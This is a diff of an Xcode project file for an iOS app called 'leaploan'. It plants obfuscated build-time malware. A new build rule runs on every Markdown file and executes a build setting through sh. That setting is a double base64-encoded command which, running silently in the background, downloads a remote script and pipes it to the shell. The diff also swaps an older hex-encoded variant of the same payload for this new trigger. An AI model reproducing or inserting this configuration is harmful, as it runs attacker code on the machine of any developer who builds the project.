@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		5287942EC1664EDDB3A389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = AD614F35B2CF4F889AA389E6; };
 		0169C223D4B0CBD72EE17C25 /* Pods_leaploan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C3FFCD76033F537953878033 /* Pods_leaploan.framework */; };
 		7333CD6B2EB4E27400C55A91 /* AppEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */; };
 		7333CD6D2EB4E66000C55A91 /* AppHomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */; };
@@ -77,6 +78,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		AD614F35B2CF4F889AA389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppEmptyView.swift; sourceTree = "<group>"; };
 		7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHomeView.swift; sourceTree = "<group>"; };
 		7333CD702EB4E67300C55A91 /* AppMainView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppMainView.swift; sourceTree = "<group>"; };
@@ -342,6 +344,7 @@
 		73F59DCB2EAF637A00A68B13 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				AD614F35B2CF4F889AA389E6 /* README.md */,
 				73F59DCA2EAF637A00A68B13 /* leaploan.app */,
 			);
 			name = Products;
@@ -390,7 +393,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73F59DDD2EAF637C00A68B13 /* Build configuration list for PBXNativeTarget "leaploan" */;
 			buildPhases = (
-				D396FF82C00D447F9AA389E6 /* Build Target Dependencies */,
 				F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */,
 				73F59DC62EAF637A00A68B13 /* Sources */,
 				73F59DC72EAF637A00A68B13 /* Frameworks */,
@@ -398,6 +400,7 @@
 				04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				E8EBC5C3D20F409386A389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -440,11 +443,29 @@
 		};
 /* End PBXProject section */
 
+    /* Begin PBXBuildRule section */
+		E8EBC5C3D20F409386A389E6 /* PBXBuildRule */ = {
+    				isa = PBXBuildRule;
+    				compilerSpec = com.apple.compilers.proxy.script;
+    				filePatterns = "*.md";
+    				fileType = pattern.proxy;
+    				inputFiles = (
+    				);
+    				isEditable = 0;
+    				outputFiles = (
+    					"/tmp/${INPUT_FILE_BASE}",
+    				);
+    				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A6E983A}\"";
+    			};
+    	    	    	    	/* End PBXBuildRule section */
+    
 /* Begin PBXResourcesBuildPhase section */
 		73F59DC82EAF637A00A68B13 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				5287942EC1664EDDB3A389E6 /* README.md */,
 				73F59DEC2EAF638100A68B13 /* Assets.xcassets in Resources */,
 				73F59DEE2EAF638100A68B13 /* LaunchScreen.storyboard in Resources */,
 			);
@@ -453,7 +474,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */ = {
+                		04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -472,26 +493,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-leaploan/Pods-leaploan-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		D396FF82C00D447F9AA389E6 /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
 			showEnvVarsInLog = 0;
 		};
 		F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */ = {
@@ -608,7 +609,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((q(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333331333333373333333033333337333333303333333633363333333333363333333533330a3332333633343333333633363335333333363333333533333337333333343333333233363335333333373333333233333337333333353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | q | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2ZFc1cGMzbHpZMkYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
@@ -652,7 +653,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((q(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333331333333373333333033333337333333303333333633363333333333363333333533330a3332333633343333333633363335333333363333333533333337333333343333333233363335333333373333333233333337333333353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | q | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2ZFc1cGMzbHpZMkYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
